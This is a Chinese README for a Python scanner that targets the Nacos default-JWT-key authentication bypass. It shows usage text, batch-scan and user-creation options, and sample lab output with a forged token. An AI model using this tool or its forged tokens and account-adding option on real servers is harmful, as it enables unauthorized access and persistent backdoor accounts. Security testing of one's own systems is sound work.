本工具仅限安全自检，非法使用所造成的一切后果由使用者承担
### 程序编写
踩了不少坑，第一次复现漏洞时忘记开nacos的鉴权，以为自己pyjwt生成的token是有效的。后面突然意识到这个问题，发现跨语言生成的jwt token都无法通过验证，可能是自己太菜了，不知道其他大佬怎么解决的。后续通过大佬帮助使用java生成token，py脚本调用jar包解决了这个问题。（实在是菜！！）

### 运行示例

```shell
 ****     **     **       ******    *******    ********   ******  **      ** ********   ******  **   **
/**/**   /**    ****     **////**  **/////**  **//////   **////**/**     /**/**/////   **////**/**  **
/**//**  /**   **//**   **    //  **     //**/**        **    // /**     /**/**       **    // /** **
/** //** /**  **  //** /**       /**      /**/*********/**       /**********/******* /**       /****
/**  //**/** **********/**       /**      /**////////**/**       /**//////**/**////  /**       /**/**
/**   //****/**//////**//**    **//**     **        /**//**    **/**     /**/**      //**    **/**//**
/**    //***/**     /** //******  //*******   ********  //****** /**     /**/******** //****** /** //**
//      /// //      //   //////    ///////   ////////    //////  //      // ////////   //////  //   //

Nacos默认key身份认证绕过漏洞及未授权漏洞检测   auth:L-ss666
vul version: 0.1.0 <= Nacos <= 2.2.0
Usage:
 -u http://10.211.55.8:8848  单个url漏洞检测
 -uadd http://10.211.55.8:8848  若存在漏洞可新增系统用户
 -f url.txt 批量进行漏洞检测


usage: NacosCheck.py [-h] [-f FILENAME] [-u URL] [-uadd USERADD]

从文本文件或单个URL中读取URL

optional arguments:
  -h, --help            show this help message and exit
  -f FILENAME, --filename FILENAME
                        包含URL的文本文件的路径
  -u URL, --url URL     要检查漏洞的单个URL
  -uadd USERADD, --useradd USERADD
                        添加用户atack,密码atact。只能添加一次，切勿重复操作！



python NacosCheck.py -u http://10.211.55.8:8848/
 ****     **     **       ******    *******    ********   ******  **      ** ********   ******  **   **
/**/**   /**    ****     **////**  **/////**  **//////   **////**/**     /**/**/////   **////**/**  **
/**//**  /**   **//**   **    //  **     //**/**        **    // /**     /**/**       **    // /** **
/** //** /**  **  //** /**       /**      /**/*********/**       /**********/******* /**       /****
/**  //**/** **********/**       /**      /**////////**/**       /**//////**/**////  /**       /**/**
/**   //****/**//////**//**    **//**     **        /**//**    **/**     /**/**      //**    **/**//**
/**    //***/**     /** //******  //*******   ********  //****** /**     /**/******** //****** /** //**
//      /// //      //   //////    ///////   ////////    //////  //      // ////////   //////  //   //

Nacos默认key身份认证绕过漏洞及未授权漏洞检测   auth:L-ss666
vul version: 0.1.0 <= Nacos <= 2.2.0
Usage:
 -u http://10.211.55.8:8848  单个url漏洞检测
 -uadd http://10.211.55.8:8848  若存在漏洞可新增系统用户
 -f url.txt 批量进行漏洞检测


http://10.211.55.8:8848/ 存在默认密钥漏洞！可使用token:eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTU5MTgwNn0.Krq98PNvqfDTIE1RIZvywjHcONIuq8uexD0Xd5zjW0o   /*或使用-uadd url进行添加用户操作。*/
```

